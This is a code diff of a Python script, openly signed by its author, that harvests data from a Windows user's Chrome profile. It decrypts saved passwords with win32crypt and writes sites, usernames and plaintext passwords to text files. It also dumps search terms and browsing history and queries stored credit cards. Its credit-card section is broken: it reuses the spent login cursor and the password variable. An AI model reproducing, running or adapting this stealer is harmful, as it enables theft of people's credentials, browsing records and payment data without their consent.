@@ -3,53 +3,84 @@ from os import getenv
 import sqlite3
 import win32crypt
 
+print("""
 
-f = open("dump.txt", "w")
-username1 = "        Username: "
-siteId = "       Site ID: "
-password_field = "   Password: "
+
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMM        MMMMMMMMMMMM
+MMMMMMMMMM            MMMMMMMMMM
+MMMMMMMMM              MMMMMMMMM
+MMMMMMMM                MMMMMMMM
+MMMMMMM                 MMMMMMMM
+MMMMMMM                  MMMMMMM
+MMMMMMM                  MMMMMMM
+MMMMMMM    MMM    MMM    MMMMMMM
+MMMMMMM   MMMMM   MMMM   MMMMMMM
+MMMMMMM   MMMMM   MMMM   MMMMMMM
+MMMMMMMM   MMMM M MMMM  MMMMMMMM
+MMVKMMMM        M        MMMMMMM
+MMMMMMMM       MMM      MMMMMMMM
+MMMMMMMMMMMM   MMM  MMMMMMMMMMMM
+MMMMMMMMMM MM       M  MMMMMMMMM
+MMMMMMMMMM  M M M M M MMMMMMMMMM
+MMMM  MMMMM MMMMMMMMM MMMMM   MM
+MMM    MMMM M MMMMM M MMMM    MM
+MMM    MMMM   M M M  MMMMM   MMM
+MMMM    MMMM         MMM      MM
+MMM       MMMM     MMMM       MM
+MMM         MMMMMMMM      M  MMM
+MMMM  MMM      MMM      MMMMMMMM
+MMMMMMMMMMM  MM       MMMMMMM  M
+MMM  MMMMMMM       MMMMMMMMM   M
+MM    MMM        MM            M
+MM            MMMM            MM
+MMM        MMMMMMMMMMMMM       M
+MM      MMMMMMMMMMMMMMMMMMM    M
+MMM   MMMMMMMMMMMMMMMMMMMMMM   M
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+By Bluedangerforyou
+""")
+f = open("passwordsusers.txt", "w")
+username1 = "Username: "
+siteId = "Site ID: "
+password_field = "Password: "
 conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
 conn3 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\History")
 conn1 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data")
-conn5 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Sync Data\SyncData.sqlite3")
 cursor3 = conn3.cursor()
 cursor1 = conn1.cursor()
 cursor = conn.cursor()
-cursor5 = conn5.cursor()
 cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 for result in cursor.fetchall():
 	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
 	if password:
-		print("Site: " + result[0])
-		print('Username: ' + result[1])
-		print('Password: ' + password)
-		print('---------------------------------------------')
-		f.write(str(siteId + result[0] + username1 + result[1] + password_field + password))
+		f.writelines(siteId + result[0] + '\n' + username1 + result[1] + '\n' + password_field + password + '\n' + '--------------------------------' + '\n')
 		
-		
+f1 = open('keywordsearches.txt','w')		
 cursor3.execute("SELECT * FROM keyword_search_terms") 
 print('---------------------------------------------')
 print("Google Keyword Searches:")
-result = cursor3.fetchall() 
-for r in result:
-        print(r)
-        f.write(str(r))
+result3 = cursor3.fetchall() 
+for r3 in result3:
+        #print (r3[2] + '\n')
+        f1.writelines(str(r3[2] + '\n'))
+        
+        
+f2 = open('history.txt', 'w')
+cursor3.execute("SELECT * FROM urls") 
+print('---------------------------------------------')
+print("Google History:")
+result4 = cursor3.fetchall() 
+for r4 in result4:
+        f2.writelines(str('\n' + r4[1] + '\n'))
 
 cursor1.execute("SELECT * FROM credit_cards")
 print('---------------------------------------------')
 print("Credit Card Data:")
-result = cursor1.fetchall() 
-for r in result:
-        print(r)
-        f.write(str(r))
-cursor5.execute("SELECT non_unique_name FROM metas") 
-result = cursor5.fetchall()
-for r in result:
-	print(r)
-	f.write(str(r))
-        
+result1 = cursor1.fetchall() 
+for result in cursor.fetchall():
+	cc = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+	if password:
+		f.writelines(siteId + result[0] + '\n' + username1 + result[1] + '\n' + password_field + password + '\n' + '--------------------------------' + '\n')
 
-
-        
-        
-
+raw_input()
